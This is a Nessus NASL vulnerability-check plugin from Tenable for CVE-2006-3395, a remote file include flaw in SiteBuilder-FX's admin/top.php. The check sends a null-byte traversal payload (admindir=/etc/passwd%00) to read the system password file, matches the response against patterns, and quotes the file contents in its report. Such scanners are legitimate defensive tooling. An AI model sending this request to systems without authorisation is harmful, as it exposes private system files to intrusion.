#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
remote file include attack. 

Description :

The remote host is running SiteBuilder-FX, a web-based design system
written in PHP. 

The version of SiteBuilder-FX installed on the remote host fails to
sanitize input to the 'admindir' parameter of the 'admin/top.php'
script before using it to include PHP code.  Regardless of the setting
of PHP's 'register_globals', an unauthenticated attacker may be able
to exploit these flaws to view arbitrary files on the remote host or
to execute arbitrary PHP code, possibly taken from third-party hosts. 

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21787);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-3395");
  script_bugtraq_id(18756);
  script_xref(name:"OSVDB", value:"26959");

  script_name(english:"SiteBuilder-FX admindir Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using SiteBuilder-FX");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/sitebuilder", "/introbuilder", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/admin/top.php?",
      "admindir=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like SiteBuilder and ...
    "<TITLE>SiteBuilder-FX" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/default\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, "<td valign=top>");
      if (contents) contents = contents - "<td valign=top>";
    }

    if (contents)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
